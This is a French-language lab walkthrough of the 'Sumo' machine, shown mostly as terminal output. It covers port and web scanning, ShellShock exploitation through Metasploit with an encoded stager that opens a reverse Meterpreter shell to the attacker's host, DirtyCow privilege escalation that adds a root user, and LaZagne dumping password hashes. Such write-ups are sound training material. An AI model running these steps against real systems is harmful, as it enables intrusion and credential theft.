\# Sumo

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌──[m0rph3u5@parrot]─[~]
└──╼ $sudo massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.253
[i] Rate: 1000
 
🔥 Masscan 192.168.56.253...100%
👁️ Nmap 192.168.56.253...100%
 
[+] 22/tcp open
[+] 80/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.253-tcp.html     |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">⚡</span> **metaWeb**

Scan de vulnérabilité `web`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $./metaWeb.sh

__________________________________________________________________/\\\______________/\\\_________________/\\\________        
 _________________________________________________________________\/\\\_____________\/\\\________________\/\\\________       
  ________________________________________/\\\_____________________\/\\\_____________\/\\\________________\/\\\________      
   ____/\\\\\__/\\\\\_______/\\\\\\\\___/\\\\\\\\\\\__/\\\\\\\\\____\//\\\____/\\\____/\\\______/\\\\\\\\__\/\\\________     
    __/\\\///\\\\\///\\\___/\\\/////\\\_\////\\\////__\////////\\\____\//\\\__/\\\\\__/\\\_____/\\\/////\\\_\/\\\\\\\\\__    
     _\/\\\_\//\\\__\/\\\__/\\\\\\\\\\\_____\/\\\________/\\\\\\\\\\____\//\\\/\\\/\\\/\\\_____/\\\\\\\\\\\__\/\\\////\\\_   
      _\/\\\__\/\\\__\/\\\_\//\\///////______\/\\\_/\\___/\\\/////\\\_____\//\\\\\\//\\\\\_____\//\\///////___\/\\\__\/\\\_  
       _\/\\\__\/\\\__\/\\\__\//\\\\\\\\\\____\//\\\\\___\//\\\\\\\\/\\_____\//\\\__\//\\\_______\//\\\\\\\\\\_\/\\\\\\\\\__ 
        _\///___\///___\///____\//////////______\/////_____\////////\//_______\///____\///_________\//////////__\/////////___
        
 by M0rPH3U53

      
[i] IP: 192.168.56.253
[i] Nom du scan: Sumo
 
⚛️ Nuclei 192.168.56.253...100%
👽 Nikto 192.168.56.253...100%
🐂 Wapiti 192.168.56.253...100%
🐟 Skipfish 192.168.56.253...100%
⚡ ZAP 192.168.56.253...100%
 
=======================================
|             📑 Rapports             |
=======================================
| /home/m0rph3u5/metaWeb/Sumo         |
=======================================
```

&nbsp;

📑 **Rapports**

Vulnérabilité `ShellShock` détecter par `nuclei`

```
┌─[m0rph3u5@parrot]─[~/Document]
└──╼ $cat metaWeb/Sumo/nuclei/Sumo-rapport.txt
[CVE-2014-6271] [http] [critical] http://192.168.56.253/cgi-bin/test [paths="/cgi-bin/test"]
[waf-detect:apachegeneric] [http] [info] http://192.168.56.253
[ssh-auth-methods] [javascript] [info] 192.168.56.253:22 ["["publickey","password"]"]
[ssh-diffie-hellman-logjam] [javascript] [low] 192.168.56.253:22
[ssh-weak-mac-algo] [javascript] [low] 192.168.56.253:22
[ssh-weak-algo-supported] [javascript] [medium] 192.168.56.253:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.56.253:22
[ssh-cbc-mode-ciphers] [javascript] [low] 192.168.56.253:22
[ssh-server-enumeration] [javascript] [info] 192.168.56.253:22 ["SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10"]
[ssh-password-auth] [javascript] [info] 192.168.56.253:22
[ssh-weakkey-exchange-algo] [javascript] [low] 192.168.56.253:22
[options-method] [http] [info] http://192.168.56.253 ["GET,HEAD,POST,OPTIONS"]
[apache-detect] [http] [info] http://192.168.56.253 ["Apache/2.2.22 (Ubuntu)"]
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.56.253
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.56.253
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.56.253
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.56.253
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.56.253
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.56.253
```

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - apache_mod_cgi_bash_env_exec**

Exploitation de `ShellShock` (CVE-2014-6271)

```
msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Generated command stager: ["echo -en \\\\x7f\\\\x45\\\\x4c\\\\x46\\\\x02\\\\x01\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x02\\\\x00\\\\x3e\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x78\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x38\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x07\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x40\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xfa\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x7c\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x31\\\\xff\\\\x6a\\\\x09\\\\x58\\\\x99\\\\xb6\\\\x10\\\\x48\\\\x89\\\\xd6\\\\x4d\\\\x31\\\\xc9\\\\x6a\\\\x22\\\\x41\\\\x5a\\\\x6a\\\\x07\\\\x5a\\\\x0f\\\\x05\\\\x48\\\\x85\\\\xc0\\\\x78\\\\x51\\\\x6a\\\\x0a\\\\x41\\\\x59\\\\x50\\\\x6a\\\\x29\\\\x58\\\\x99\\\\x6a\\\\x02\\\\x5f\\\\x6a\\\\x01\\\\x5e\\\\x0f\\\\x05\\\\x48\\\\x85\\\\xc0\\\\x78\\\\x3b\\\\x48\\\\x97\\\\x48\\\\xb9\\\\x02\\\\x00\\\\x11\\\\x5c\\\\xc0\\\\xa8\\\\x38\\\\x95\\\\x51\\\\x48\\\\x89\\\\xe6\\\\x6a\\\\x10\\\\x5a\\\\x6a\\\\x2a\\\\x58\\\\x0f\\\\x05\\\\x59\\\\x48\\\\x85\\\\xc0\\\\x79\\\\x25\\\\x49\\\\xff\\\\xc9\\\\x74\\\\x18\\\\x57\\\\x6a\\\\x23\\\\x58\\\\x6a\\\\x00\\\\x6a\\\\x05\\\\x48\\\\x89\\\\xe7\\\\x48\\\\x31\\\\xf6\\\\x0f\\\\x05\\\\x59\\\\x59\\\\x5f\\\\x48\\\\x85\\\\xc0\\\\x79\\\\xc7\\\\x6a\\\\x3c\\\\x58\\\\x6a\\\\x01\\\\x5f\\\\x0f\\\\x05\\\\x5e\\\\x6a\\\\x7e\\\\x5a\\\\x0f\\\\x05\\\\x48\\\\x85\\\\xc0\\\\x78\\\\xed\\\\xff\\\\xe6>>/tmp/obgNh ; chmod 777 /tmp/obgNh ; /tmp/obgNh"]
[*] Command Stager progress - 100.00% done (1307/1307 bytes)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3090404 bytes) to 192.168.56.253
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.253:44706) at 2025-09-26 19:12:37 +0200

(Meterpreter 1)(/usr/lib/cgi-bin) > 
```

&nbsp;

&nbsp;🛰️ **fullEx**

Élévation de privilège

```
www-data@ubuntu:/tmp/fullEx$ bash fullEx.sh -perm
bash fullEx.sh -perm
www-data@ubuntu:/tmp/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-		 
   rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve- 
   2016-5195_5.sh

```

&nbsp;

Cette faille va crée un `utilisateur` root avec un mot de passe au choix

```
www-data@ubuntu:/tmp/fullEx$ ./fullEx.sh -DirtyCow
./fullEx.sh -DirtyCow
[+] Compilation successfuly !
[+] PATH=/tmp/fullEx/exploits/DirtyCow/dcow
[+] Executing the binary...
Please enter the new password: azerty

/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:ficJjR.juFRg6:0:0:pwned:/root:/bin/bash

mmap: 7fdfeb990000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'azerty'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:ficJjR.juFRg6:0:0:pwned:/root:/bin/bash

mmap: 7fdfeb990000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'azerty'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Binary file (standard input) matches

firefart@ubuntu:~# id
id
uid=0(firefart) gid=0(root) groups=0(root)
```

&nbsp;

Recherche d’identifiant sur la machine

```
firefart@ubuntu:/tmp/fullEx# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: sumo
Hash: $6$Dwwfblv6$zDJAYgIZaCyc7loCZbPhPF7JStFdcGBUl/5Uh5PqNh.ZMF7kcCVncDkCkxbXEL9WYCqfp74cZ9I23tfFM1N8Y1:18393:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$uLEK.x7F$Ztyk7/wT39wxJfkL1/bgqNmU4RwB39jIY/Ol9fdc/pvPXubSWi.s0XbkMBGe2FOIh.5av/qMLmkOQeXwr981.0:18393:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 2.48991084099
```

&nbsp;